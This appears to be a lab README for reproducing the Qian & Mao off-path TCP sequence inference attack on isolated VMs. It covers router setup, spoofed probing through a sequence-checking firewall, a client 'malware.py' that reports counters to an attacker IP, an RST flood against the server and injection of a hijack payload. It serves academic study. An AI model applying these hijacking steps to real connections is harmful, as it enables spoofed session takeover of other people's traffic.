Reset-the-Server Hijacking — Paper-Faithful Setup
Reference
Qian & Mao, "Off-Path TCP Sequence Number Inference Attack",
IEEE S&P 2012, Figure 4, Section IV-B
Why Your Previous Attempt Failed
The binary search showed `diff=3` on every probe (all IN-WINDOW).
Root cause: NAT on the router.
```
Your setup:
  Client (10.0.0.10) ──NAT──→ Server sees connection from 20.0.0.1
  Attacker spoofs probe with src=10.0.0.10
  Server receives from 10.0.0.10 (not 20.0.0.1) → unknown connection → RST
  RST reaches client → InSegs+1 EVERY TIME regardless of SEQ
  Binary search has no signal → always converges to 0
```
Fix: disable NAT, use pure routing. The paper's firewall middlebox
just does sequence-number checking — it doesn't need to do NAT.
Network Topology
```
         Attacker (30.0.0.30)
               │
          30.0.0.0/24
               │
    ┌──────────────────────┐
    │   Router             │
    │   firewall.py        │
    │   (pure routing,     │
    │    NO NAT)           │
    └──────────────────────┘
         │            │
    10.0.0.0/24    20.0.0.0/24
         │            │
    Client          Server
   (10.0.0.10)    (20.0.0.20)
    malware.py     server.py
```
Critical Router Setup
Remove ALL NAT rules
```bash
# Remove any existing NAT
sudo iptables -t nat -F

# Verify no NAT rules remain
sudo iptables -t nat -L
# Should show all chains ACCEPT with no rules
```
Enable pure routing + firewall NFQUEUE
```bash
sudo sysctl -w net.ipv4.ip_forward=1

# Firewall intercepts all forwarded TCP
sudo iptables -F FORWARD
sudo iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 0

# Allow non-TCP traffic (ICMP etc)
sudo iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 0
sudo iptables -A FORWARD ! -p tcp -j ACCEPT
```
Start the firewall
```bash
sudo python3 firewall.py
```
Verify No NAT
After setup, from the client connect to the server:
```bash
# Client:
nc 20.0.0.20 8080
```
On the server, check what source IP it sees:
```bash
# Server:
ss -tn | grep 8080
```
Must show `10.0.0.10:xxxxx` (the real client IP).
If it shows `20.0.0.1:xxxxx` — NAT is still active, remove it.
Running the Attack
1. Server VM
```bash
python3 server.py
```
2. Router VM
```bash
# Remove NAT, set up NFQUEUE (see above)
sudo python3 firewall.py
```
3. Attacker VM
```bash
sudo python3 reset_attack.py
```
4. Client VM — terminal 1
```bash
python3 malware.py
```
5. Client VM — terminal 2
```bash
nc 20.0.0.20 8080
hello
```
6. Watch the attack
The attacker will automatically:
```
Step 4:  RST flood → server (65536 packets)
         Server connection torn down

Step 6:  Binary search → Server SEQ
         32 iterations, diff=0 or diff=1

Step 7:  Binary search → Client SEQ
         32 iterations, diff=0 or diff=1

Step 8:  Inject malicious response → client
         Client receives "HIJACKED BY ATTACKER"
```
How the Side-Channel Works (Paper §III-C, §III-D)
For Server SEQ (probes: spoofed server → client)
```
Attacker sends: src=20.0.0.20 dst=10.0.0.10 SEQ=guess

Firewall checks guess against server_seq window:
  IN-WINDOW  → probe forwarded → reaches client → InSegs + 1
  OUT-OF-WINDOW → firewall drops → nothing → InSegs unchanged

Malware reads InSegs before/after → diff = 0 or 1
Binary search narrows range by half each iteration
32 iterations → exact server_seq
```
For Client SEQ (probes: spoofed client → server, AFTER server reset)
```
Attacker sends: src=10.0.0.10 dst=20.0.0.20 SEQ=guess

Firewall checks guess against client_seq window:
  IN-WINDOW  → probe forwarded → reaches reset server
               → server sends RST(seq=0) back
               → RST passes firewall (no RST validation)
               → RST reaches client → InSegs + 1
               (client ignores RST because seq=0 is out of client's TCP window)
  OUT-OF-WINDOW → firewall drops → nothing → InSegs unchanged

Same binary search → exact client_seq
```
Config
Edit `reset_attack.py`:
```python
SERVER_IP   = "20.0.0.20"
CLIENT_IP   = "10.0.0.10"
GW_MAC      = "xx:xx:xx:xx:xx:xx"   # arp -n | grep 30.0.0.1
IFACE       = "eth0"
```
Edit `malware.py`:
```python
ATTACKER_IP   = "30.0.0.30"
ATTACKER_PORT = 9999
```
Expected Binary Search Output
```
  BINARY SEARCH — Server SEQ

  [ 1]  SEQ=2147483647     [0, 2147483647]            diff=1  ✓ IN-WINDOW
  [ 2]  SEQ=1073741823     [0, 1073741823]            diff=0  ✗ OUT-OF-WINDOW
  [ 3]  SEQ=536870912      [536870912, 1073741823]    diff=1  ✓ IN-WINDOW
  ...
  [32]  SEQ=987654321      [987654321, 987654321]     diff=1  ✓ IN-WINDOW

  >>> Server SEQ = 987654321
```
Key: diff alternates between 0 and 1 as the search narrows.
If diff is always the same value → NAT is still on or firewall not running.
Files
File	VM	Paper requirement
`firewall.py`	Router	Sequence-number-checking middlebox (§III-A)
`reset_attack.py`	Attacker	Full attack: RST + inference + injection
`malware.py`	Client	C1 + C2 + C3: Internet, counters, 4-tuples
`server.py`	Server	Target server (with S1: drops out-of-state)
